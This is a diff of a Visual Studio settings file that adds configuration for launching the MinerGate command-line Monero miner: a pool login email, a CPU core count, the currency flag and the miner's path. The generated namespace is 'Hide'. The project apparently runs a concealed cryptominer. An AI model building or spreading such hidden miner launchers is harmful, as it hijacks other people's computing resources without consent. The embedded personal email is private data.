@@ -1,7 +1,18 @@
 ﻿<?xml version='1.0' encoding='utf-8'?>
-<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)">
-  <Profiles>
-    <Profile Name="(Default)" />
-  </Profiles>
-  <Settings />
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="Hide.Properties" GeneratedClassName="Settings">
+  <Profiles />
+  <Settings>
+    <Setting Name="user" Type="System.String" Scope="User">
+      <Value Profile="(Default)">kirill.nikolaich@yandex.ru</Value>
+    </Setting>
+    <Setting Name="cpuCoreCount" Type="System.String" Scope="User">
+      <Value Profile="(Default)">3</Value>
+    </Setting>
+    <Setting Name="currency" Type="System.String" Scope="User">
+      <Value Profile="(Default)">-xmr</Value>
+    </Setting>
+    <Setting Name="pathToProcess" Type="System.String" Scope="User">
+      <Value Profile="(Default)">d:\Share\MinerGate-cli-4.04-win64\minergate-cli.exe</Value>
+    </Setting>
+  </Settings>
 </SettingsFile>
